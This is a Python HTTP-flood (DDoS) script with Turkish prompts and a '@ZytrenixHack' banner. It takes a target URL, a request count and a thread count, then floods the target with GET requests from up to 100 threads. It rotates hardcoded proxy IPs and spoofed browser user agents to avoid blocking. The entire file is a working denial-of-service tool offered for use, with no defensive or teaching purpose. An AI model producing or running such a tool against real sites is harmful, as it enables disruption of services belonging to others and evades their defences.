import threading
import requests
import random
import subprocess
import os

KIRMIZI = '\033[91m'
SON = '\033[0m'

proxies_list = [
    'http://108.181.56.101:3128',
    'http://50.174.7.158:80',
    'http://178.48.68.61:18080',
    'http://50.221.230.186:80',
    'http://50.175.212.79:80'
]

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
]

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{KIRMIZI}
╔══════════════════════════════════════════════════════════╗
║                 DDOS                     ║
║                   @ZytrenixHack                          ║
║                 İYİ KULLANIMLAR                       ║
╚══════════════════════════════════════════════════════════╝
    {SON}""")

def saldir(i, url):
    user_agent = random.choice(user_agents)
    proxy = {'http': random.choice(proxies_list)} if random.choice([True, False]) else None
    
    headers = {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    try:
        if proxy:
            response = requests.get(url, headers=headers, proxies=proxy, timeout=10)
        else:
            response = requests.get(url, headers=headers, timeout=10)
            
        if response.status_code == 200:
            print(f"{KIRMIZI}[+] İstek {i} gönderildi - Durum: {response.status_code}{SON}")
        else:
            print(f"{KIRMIZI}[!] İstek {i} - Durum: {response.status_code}{SON}")
    except requests.exceptions.RequestException as e:
        print(f"{KIRMIZI}[-] İstek {i} başarısız: {str(e)[:50]}...{SON}")
    except Exception as e:
        print(f"{KIRMIZI}[!] İstek {i} hatası: {str(e)[:30]}{SON}")

def main():
    banner()
    
    print(f"\n{KIRMIZI}[!] @ZytrenixHack!{SON}")
    print(f"{KIRMIZI}[!] @ZytrenixPY!{SON}\n")
    
    while True:
        try:
            url = input(f"{KIRMIZI}[+] Hedef URL girin (http/https ile): {SON}")
            if url.startswith(('http://', 'https://')):
                break
            else:
                print(f"{KIRMIZI}[!] Lütfen geçerli bir URL girin!{SON}")
        except:
            continue
    
    while True:
        try:
            num_requests = int(input(f"{KIRMIZI}[+] Gönderilecek istek sayısı: {SON}"))
            if num_requests > 0:
                break
            else:
                print(f"{KIRMIZI}[!] Pozitif bir sayı girin!{SON}")
        except:
            print(f"{KIRMIZI}[!] Geçerli bir sayı girin!{SON}")
    
    while True:
        try:
            thread_sayisi = int(input(f"{KIRMIZI}[+] Thread (iş parçacığı) sayısı (1-100): {SON}"))
            if 1 <= thread_sayisi <= 100:
                break
            else:
                print(f"{KIRMIZI}[!] 1-100 arası bir değer girin!{SON}")
        except:
            print(f"{KIRMIZI}[!] Geçerli bir sayı girin!{SON}")
    
    print(f"\n{KIRMIZI}[*] Saldırı başlatılıyor...{SON}")
    print(f"{KIRMIZI}[*] Hedef: {url}{SON}")
    print(f"{KIRMIZI}[*] Toplam İstek: {num_requests}{SON}")
    print(f"{KIRMIZI}[*] Thread Sayısı: {thread_sayisi}{SON}")
    print(f"{KIRMIZI}[*] CTRL+C ile durdurabilirsiniz...{SON}\n")
    
    threads = []
    istek_sayacı = 0
    
    try:
        while istek_sayacı < num_requests:
            aktif_threadler = [t for t in threads if t.is_alive()]
            
            if len(aktif_threadler) < thread_sayisi:
                istek_sayacı += 1
                t = threading.Thread(target=saldir, args=(istek_sayacı, url))
                t.daemon = True
                t.start()
                threads.append(t)
            
            threads = [t for t in threads if t.is_alive()]
            
            if istek_sayacı % 10 == 0:
                print(f"{KIRMIZI}[*] Gönderilen istek: {istek_sayacı}/{num_requests}{SON}")
    
    except KeyboardInterrupt:
        print(f"\n{KIRMIZI}[!] Saldırı durduruldu!{SON}")
    
    for t in threads:
        try:
            t.join(timeout=2)
        except:
            pass
    
    print(f"\n{KIRMIZI}[*] Saldırı tamamlandı!{SON}")
    print(f"{KIRMIZI}[*] Toplam {istek_sayacı} istek gönderildi.{SON}")
    
    input(f"\n{KIRMIZI}[*] Ana menüye dönmek için Enter'a basın...{SON}")
    
    subprocess.run(['python', 'inst.py'] if os.path.exists('inst.py') else ['python', __file__])

if __name__ == "__main__":
    main()